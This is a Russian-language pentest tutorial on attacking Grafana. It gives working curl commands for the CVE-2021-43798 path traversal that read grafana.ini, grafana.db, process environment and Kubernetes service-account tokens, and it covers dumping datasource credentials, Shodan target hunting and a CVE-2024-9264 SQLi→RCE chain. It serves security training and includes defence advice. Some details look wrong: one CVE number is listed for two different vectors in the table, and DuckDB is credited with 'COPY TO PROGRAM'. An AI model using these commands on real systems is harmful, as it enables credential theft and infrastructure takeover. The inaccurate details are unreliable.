---
id: web-grafana
title: "Grafana: CVE-2021-43798 (LFI) и CVE-2024-9264 (SQLi→RCE)"
category: web
parent: web-devops-surfaces
difficulty: medium
order: 1
tags: [grafana, monitoring, lfi, path-traversal, sqli, rce, cve]
prerequisites: [web-devops-surfaces]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 70
summary: "Grafana как цель: определение версии, path traversal CVE-2021-43798 для чтения конфигов, SQLi→RCE CVE-2024-9264 и извлечение кред."
---

## Вопрос, с которого всё начинается

Grafana — самая популярная панель мониторинга. Через неё инженеры смотрят метрики, алерты и дашборды, а под капотом у неё — подключения к базам данных и Prometheus, часто с логинами и паролями. Grafana годами держится в топе целей: у неё есть неаутентифицированные LFI и SQLi, которые дают доступ к конфигам и кредам. Разберём.

## Наш пример: Grafana 8.3.0

Цель — `https://grafana.target.example`. Версию отдаёт `/api/health`:

```
$ curl -s https://grafana.target.example/api/health
{"commit":"...","database":"ok","version":"8.3.0"}
```

Версия **8.3.0** попадает в диапазон CVE-2021-43798 (8.0.0–8.3.0). Отлично — ищем PoC.

## Шаг 1: CVE-2021-43798 — path traversal (LFI)

Уязвимость позволяет **без аутентификации** читать локальные файлы через обход пути в эндпоинте плагинов:

```
$ curl --path-as-is 'https://grafana.target.example/public/plugins/alertlist/../../../../../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
```

Работает потому, что Grafana не нормализовала путь перед отдачей файла. Целимся в конфиг:

```
$ curl --path-as-is 'https://grafana.target.example/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini'
[security]
admin_user = admin
admin_password = SuperSecret123
[database]
password = dbpass
```

Мы получили админский пароль и креды БД. Grafana взломана без единой попытки входа.

## Шаг 2: datasource — креды других систем

Даже без LFI Grafana хранит **datasource** — подключения к базам и Prometheus. Если есть доступ к API datasource (анонимный или после входа), читаем их конфиги:

```
$ curl -s -u admin:SuperSecret123 https://grafana.target.example/api/datasources
[{"name":"prod-mysql","type":"mysql","url":"...","user":"root","password":"..."}]
```

Так панель мониторинга превращается в набор доступов к продовым базам.

## Шаг 3: CVE-2024-9264 — SQLi→RCE

Более свежая уязвимость — **SQL-инъекция** в SQL Expressions (CVE-2024-9264), которая через `duckdb` приводит к выполнению команд. Требует аутентификации (VIEWER), но при утёкшем пароле (см. выше) доступна:

```
POST /api/ds/query
{"queries":[{"expr":"SELECT ..."}]}
```

Через инъекцию выполняется `COPY ... TO PROGRAM` (в duckdb) — это RCE.

## Шаг 4: план атаки на Grafana

1. Версия (`/api/health`).
2. Проверка CVE-2021-43798 (path traversal).
3. Чтение `grafana.ini` → админ-пароль, креды БД.
4. Дамп datasource.
5. При аутентификации — проверка CVE-2024-9264.
6. Пост-эксплуатация — креды к продовым системам.

## Шаг 5: как не навредить

Grafana — панель мониторинга, её падение ослепляет команду. SQLi-эксплуатация и `COPY TO PROGRAM` — потенциально деструктивны. Поэтому: LFI — только чтение; SQLi — подтверждение без изменения данных; RCE — только при разрешении.

## Шаг 6: чек-лист по Grafana

1. Версия.
2. Path traversal (CVE-2021-43798).
3. Чтение grafana.ini.
4. Дамп datasource.
5. Проверка CVE-2024-9264 (при auth).
6. Сопоставление с CVE.

## Что мы теперь знаем

- Grafana версию отдаёт `/api/health`.
- CVE-2021-43798 — неаутентифицированный LFI через обход пути.
- `grafana.ini` содержит админ-пароль и креды БД.
- Datasource — доступы к продовым системам.
- CVE-2024-9264 — SQLi→RCE при аутентификации.

## Шаг 7: как извлечь максимум из Grafana-LFI

Одна уязвимость чтения файлов даёт больше, чем кажется. Помимо `grafana.ini`, тяни: `/etc/grafana/grafana.ini` (креды БД, admin-пароль, SMTP), `/var/lib/grafana/grafana.db` (SQLite с пользователями и datasource), переменные окружения процесса (`/proc/self/environ`), а в Kubernetes — `/var/run/secrets/kubernetes.io/serviceaccount/token` (токен сервис-аккаунта → доступ к кластеру).

Так LFI в панели мониторинга превращается в доступ к Kubernetes. Это типичный пример цепочки: маленькая утечка → большой импакт.

## Шаг 8: как оценивать импакт Grafana-находки

LFI с чтением `grafana.ini` = админ-пароль и креды БД (высокий). Дамп datasource = доступы к продовым базам (критический по последствиям). SQLi→RCE = контроль сервера (критический). В отчёте перечисли конкретные системы, к которым получены доступы, — это то, что волнует заказчика.

## Шаг 9: типовые ошибки при работе с Grafana

Ошибка первая — проверять LFI без `--path-as-is` (curl нормализует путь и запрос не сработает). Вторая — не читать `grafana.db` (там datasource с паролями). Третья — запускать деструктивную SQLi на проде. Четвёртая — забыть, что после чтения конфига можно войти легитимно и уже оттуда дампить datasource.

## Шаг 10: как читать публичный PoC для Grafana

PoC для CVE-2021-43798 — это `curl`-команда или короткий скрипт. Прочитай его: он должен только **читать** файл, не менять ничего. Замени путь на целевой (`grafana.ini`, `grafana.db`, service-account token). Никаких деструктивных действий — LFI по определению безопасен, если не тянуть бинарники гигабайтами.

## Шаг 11: как связать Grafana с облаком и Kubernetes

Grafana часто развёрнута в Kubernetes. Тогда LFI читает: `/var/run/secrets/kubernetes.io/serviceaccount/token` (токен), `/var/run/secrets/kubernetes.io/serviceaccount/ca.crt` и namespace. С токеном можно обращаться к API Kubernetes (`https://kubernetes.default.svc`) и, если RBAC позволяет, читать секреты кластера. Это классическая эскалация «панель → кластер».

## Шаг 12: как защититься от Grafana-атак

Защита: обновление до пропатченной версии (CVE-2021-43798 закрыта в 8.3.1); ограничение доступа к панели (не в интернет); отключение анонимного доступа; минимальные права datasource; ротация админ-пароля. Для атакующего: свежая Grafana закрывает LFI, и остаются SQLi (при auth) и конфигурационные дыры.

## Шаг 13: почему Grafana — частая цель bug bounty

Grafana легко найти: порт 3000, узнаваемый интерфейс, много инстансов в интернете. И у неё регулярно выходят CVE (LFI, SQLi, обход аутентификации). Поэтому в bounty её ищут массово. Практический приём: ищи Grafana через Shodan/Censys (`http.title:"Grafana"`), определяй версию и сверяй с CVE. Это дешёвая разведка с высокой отдачей.

## Шаг 14: как оформить находку

Укажи: точную версию и источник; применимый CVE; подтверждение (прочитанный файл с доказательством, но без выкладывания самих секретов в открытый отчёт); список систем, к которым получены доступы; рекомендации. Секреты в отчёте маскируй, но фиксируй факт доступа.

## Практика: максимально используем Grafana-LFI

CVE-2021-43798 даёт чтение файлов через любой включённый плагин. Список плагинов утекает из `/api/plugins`:

```
$ curl -s https://grafana.target.example/api/plugins | grep -oE '"id":"[^"]+"' | head
"id":"alertlist"
"id":"graphite"
"id":"prometheus"
```

Теперь читаем конфиги по очереди. Самое ценное:

```
$ curl -s --path-as-is "https://grafana.target.example/public/plugins/alertlist/../../../../../../etc/grafana/grafana.ini" | grep -iE 'admin|secret|password'
admin_user = admin
admin_password = SuperSecret1
secret_key = xxxxxxxxxxxxxxxxxx
```

`admin_password` — вход в панель, `secret_key` — подпись токенов. Дальше читаем `/etc/grafana/provisioning/datasources/*.yaml` — там креды к Prometheus/InfluxDB/Elasticsearch. Это уже полноценный доступ к мониторингу всей инфраструктуры.

## Практика: datasource как мост к другим системам

Войдя в Grafana, первым делом смотри `/api/datasources`:

```
$ curl -s -H "Authorization: Bearer <grafana-token>" https://grafana.target.example/api/datasources | head -c 300
[{"id":1,"name":"Prometheus","type":"prometheus","url":"http://prometheus:9090",...
```

Здесь видно: внутренние адреса, порты, креды (в `basicAuthUser`/`secureJsonData`). Обычно это Elasticsearch с логами (там токены в тексте логов), InfluxDB с метриками (там имена хостов), Loki. Grafana фактически даёт **обзор всей внутренней сети** — и это ценнее, чем RCE на одной машине.

## Практика: CVE-2024-9264 — SQLi → RCE

CVE-2024-9264 — SQL-инъекция в функции `csv` (SQL Expressions), позволяющая выполнять команды через DuckDB. Требует аутентификации (любой пользователь, включая viewer, если включена `sqlExpressions`). Проверка: отправить запрос с payload к `/api/ds/query` и посмотреть, выполнится ли файловая операция DuckDB. Как и всегда, сначала подтверди версию и что функция включена, потом — минимальный payload.

## Таблица: Grafana-векторы

| Вектор | CVE | Уязвимые версии | Условие |
|---|---|---|---|
| Path traversal (LFI) | CVE-2021-43798 | 8.0–8.3.0 | без аутентификации |
| SQLi → RCE | CVE-2024-9264 | 11.0–11.2.1 | аутентификация |
| XSS | CVE-2022-31107 | 8.x–9.x | OAuth-логин |
| Account takeover | CVE-2022-31107 | 9.0–9.2.3 | браузер |

## Как связать Grafana с облаком и Kubernetes

Grafana часто стоит в Kubernetes и имеет доступ к кластеру. В datasources может быть Prometheus, скрейпящий kubelet (`:10250`), и Loki. Через `/api/datasources` видно адреса kube-apiserver (`:6443`) и kubelet. Если у Grafana есть service-account с правами, её токен лежит в `/var/run/secrets/kubernetes.io/serviceaccount/token` — читается через тот же LFI. Тогда компромисс Grafana = доступ к Kubernetes API, а это уже контейнеры и секреты кластера. Все адреса и токены фиксируй: это карта для следующего этапа.

## Шпаргалка: команды для Grafana

Быстрый чек-лист. Версия: `curl -s https://host/api/health` (в теле `"version"`). Плагины: `curl -s https://host/api/plugins | grep -oE '"id":"[^"]+"'`. LFI (CVE-2021-43798): `curl -s --path-as-is "https://host/public/plugins/alertlist/../../../../../../etc/passwd"`. Конфиг: тот же приём с `/etc/grafana/grafana.ini`. Анонимный доступ: `curl -s https://host/api/org`. Datasources (с токеном): `curl -s -H 'Authorization: Bearer <t>' https://host/api/datasources`. Проверка SQL-функции для CVE-2024-9264: запрос к `/api/ds/query`. Каждую команду выполняй по одной и сохраняй результат — LFI подтверждается только выводом реального файла.

## Почему панель мониторинга — недооценённая цель

Grafana, Kibana и Prometheus считаются «вспомогательными» сервисами, и их часто ставят без пароля «на минутку», которая длится годами. Но панель видит **всё**: метрики всех хостов, логи всех приложений, адреса внутренних сервисов, а через datasources — доступ к базам и очередям. По сути это готовая карта инфраструктуры и точка pivot одновременно. Отсюда практический вывод: при внутреннем сканировании порт 3000/5601/9090 должен проверяться в первую очередь, а LFI в Grafana — считаться находкой высокого уровня, потому что за ней стоит вся сеть.

## Короткий итог по Grafana

Три ключа к Grafana: включённый плагин (для LFI), `grafana.ini` (для админа), datasources (для сети). Нашёл один — почти всегда найдёшь и два других. Держи эту цепочку в голове как единое целое.

## Заметка про безопасность проверок

При работе с Grafana помни: LFI — это чтение, а не запись. Не пытайся через traversal писать файлы (это уже другая уязвимость и другой уровень риска). Ограничься чтением конфигов и не трогай базы данных и dashboards продакшена. Так проверка остаётся неразрушающей, а находка — доказанной.

## Квиз

Проверь себя.

```quiz
- question: "Как узнать версию Grafana?"
  options:
    - "Через /api/health"
    - "Через /wp-json/"
    - "Через robots.txt"
    - "Через sitemap"
  answer: 0
  explanation: "health отдаёт поле version."
- question: "Что делает CVE-2021-43798?"
  options:
    - "XSS"
    - "Path traversal (LFI) без аутентификации"
    - "CSRF"
    - "clickjacking"
  answer: 1
  explanation: "Обход пути в эндпоинте плагинов."
- question: "Что ценного в grafana.ini?"
  options:
    - "Только тема"
    - "Админ-пароль и креды БД"
    - "Ничего"
    - "Пароль почты"
  answer: 1
  explanation: "Секция security и database."
- question: "Что хранит datasource Grafana?"
  options:
    - "Подключения к базам/Prometheus с кредами"
    - "Только дашборды"
    - "Только метрики"
    - "Ничего"
  answer: 0
  explanation: "Это креды к продовым системам."
- question: "Чем опасна CVE-2024-9264?"
  options:
    - "Ничем"
    - "SQLi→RCE через duckdb"
    - "Только XSS"
    - "Только CSRF"
  answer: 1
  explanation: "COPY TO PROGRAM даёт исполнение."
```

## Куда дальше

Дальше — Kibana и её прототип-поллюция. А пока запомни: **Grafana LFI читает grafana.ini, а datasource — это креды к проду.**

## Где пригодится

- Пентест внутренней сети (Grafana почти везде).
- Bug bounty: открытые панели мониторинга.
- CTF: задания с CVE Grafana.
